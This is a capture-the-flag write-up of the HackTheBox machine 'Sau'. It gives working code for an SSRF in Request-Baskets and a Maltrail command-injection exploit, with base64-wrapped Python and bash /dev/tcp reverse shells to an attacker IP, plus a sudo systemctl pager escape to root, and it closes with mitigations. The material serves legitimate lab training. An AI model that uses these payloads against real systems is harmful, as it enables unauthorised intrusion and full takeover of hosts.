---
title: "Sau - HackTheBox"
description: "Writeup of the Sau machine from HackTheBox, an easy Linux machine involving SSRF in Request-Baskets and Maltrail exploitation."
pubDate: 2024-11-02
platform: "htb"
category: "machines"
difficulty: "easy"
os: "linux"
language: en
tags: ["ssrf", "request-baskets", "maltrail", "CVE-2023-27163", "command-injection"]
retired: false
logo: "/images/writeups/htb/sau/logo.png"
heroImage: "/images/writeups/htb/sau/card.png"
attackVectors: ["web"]
techniques: ["T1190", "T1918", "T1059"]
vulnerabilities: ["CVE-2023-27163", "CVE-2023-26035"]
certifications: ["OSCP", "eJPT"]
skillLevel: "beginner"
estimatedTime: "1-2 hours"
points: 20
rating: 4.4
---

# Sau - HackTheBox Writeup

**Difficulty**: Easy  
**OS**: Linux  
**Platform**: HackTheBox  
**IP**: 10.10.11.224

## Introduction

Sau is an easy Linux machine featuring a Request-Baskets service vulnerable to SSRF (CVE-2023-27163). Using this vulnerability, we'll access an internal Maltrail service that is vulnerable to command injection, allowing us to gain initial access and subsequently escalate privileges via sudo.

## Reconnaissance

### Port Scanning

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.224 -oG allPorts
```

**Open ports:**
- 22/tcp - SSH
- 55555/tcp - HTTP (initially filtered)
- 80/tcp - HTTP (filtered)

### Service Scanning

```bash
nmap -p22,55555,80 -sCV 10.10.11.224 -oN targeted
```

**Results:**
- **22/tcp** - OpenSSH 8.2p1 Ubuntu
- **55555/tcp** - HTTP - request-baskets 1.2.1
- **80/tcp** - Filtered

## Web Enumeration

### Request-Baskets (Port 55555)

Accessing `http://10.10.11.224:55555`, we find **Request-Baskets v1.2.1**, a tool to create temporary HTTP endpoints.

### Vulnerability Research

Searching for Request-Baskets 1.2.1 vulnerabilities, we find **CVE-2023-27163** - Server-Side Request Forgery (SSRF).

## Exploitation

### CVE-2023-27163 - SSRF in Request-Baskets

This vulnerability allows an attacker to access internal resources using the server as a proxy.

### Creating a basket

```bash
curl -X POST http://10.10.11.224:55555/api/baskets/test -H 'Content-Type: application/json' -d '{"forward_url": "http://127.0.0.1:80/","proxy_response": true,"insecure_tls": false,"expand_path": true,"capacity": 250}'
```

or using the web interface, create a basket named "test" with the configuration:
- **Forward URL**: http://127.0.0.1:80/
- **Proxy Response**: ✓

### Accessing Internal Service

Access `http://10.10.11.224:55555/test` and we're redirected to the internal service on port 80.

### Maltrail Discovery

The internal service is **Maltrail v0.53**, a malicious traffic detection system.

## Maltrail Exploitation

### CVE-2023-26035 - Command Injection in Maltrail

Maltrail v0.53 is vulnerable to command injection without authentication on the login endpoint.

### Available PoC

```bash
git clone https://github.com/spookier/Maltrail-v0.53-Exploit
cd Maltrail-v0.53-Exploit
```

### Exploit Modification

The original exploit does RCE directly. We modify it to use SSRF:

```python
#!/usr/bin/env python3
import sys
import os
import base64
import requests

def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <LHOST> <LPORT>")
        sys.exit(1)
    
    lhost = sys.argv[1]
    lport = sys.argv[2]
    
    # Reverse shell payload
    payload = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\"])'"
    
    # Encode payload
    encoded = base64.b64encode(payload.encode()).decode()
    
    # Target through SSRF
    target = "http://10.10.11.224:55555/test"
    
    # Malicious username
    username = f";`echo {encoded}|base64 -d|bash`"
    
    # Send exploit
    data = {"username": username}
    
    print(f"[+] Sending exploit to {target}")
    requests.post(target + "/login", data=data)
    print(f"[+] Check your listener on {lhost}:{lport}")

if __name__ == "__main__":
    main()
```

### Exploit Execution

```bash
# Set up listener
nc -lvnp 443

# Run exploit
python3 exploit.py 10.10.14.5 443
```

**Shell obtained as user:** puma

### TTY Treatment

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

**User flag:**
```bash
cat /home/puma/user.txt
```

## Privilege Escalation

### Sudo Privileges Enumeration

```bash
sudo -l
```

**Result:**
```
User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

### systemctl Exploitation

We can run `systemctl status` without password. This command uses `less` as a pager, which allows us to execute commands.

### Method 1: Escape from less

```bash
sudo /usr/bin/systemctl status trail.service
# Inside less, press:
!bash
```

We get shell as root.

### Method 2: PAGER Variable

```bash
sudo PAGER='bash -c "bash -i >&/dev/tcp/10.10.14.5/9001 0>&1"' /usr/bin/systemctl status trail.service
```

### Method 3: GTFOBins

```bash
sudo /usr/bin/systemctl status trail.service
!/bin/sh
```

**Root flag:**
```bash
cat /root/root.txt
```

## Alternative Exploitation - Manual

### Manual SSRF

1. Create basket in web interface
2. Configure Forward URL: `http://127.0.0.1:80/`
3. Enable "Proxy Response"
4. Access the basket

### Manual Maltrail RCE

```bash
# Listener
nc -lvnp 443

# Manual exploit with curl
curl -X POST 'http://10.10.11.224:55555/test/login' \
  --data 'username=;`python3 -c '"'"'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'"'"'`'
```

## Conclusion

Sau is an excellent machine to practice:
- SSRF exploitation (CVE-2023-27163)
- Pivoting through internal services
- Command injection in web applications
- systemctl and pager exploitation
- Command escape techniques

**Lessons Learned:**
- Internal services can be accessible via SSRF
- Always enumerate filtered services
- Validate input in all user parameters
- Commands with pagers (less, more) can be escalation vectors
- Review sudo permissions carefully

**Mitigations:**
- Update Request-Baskets to patched versions
- Implement strict URL validation in proxies
- Update Maltrail to the latest version
- Sanitize input in authentication endpoints
- Limit sudo commands to specific operations without shell escape
- Use systemctl with --no-pager when possible
- Implement network segmentation for internal services
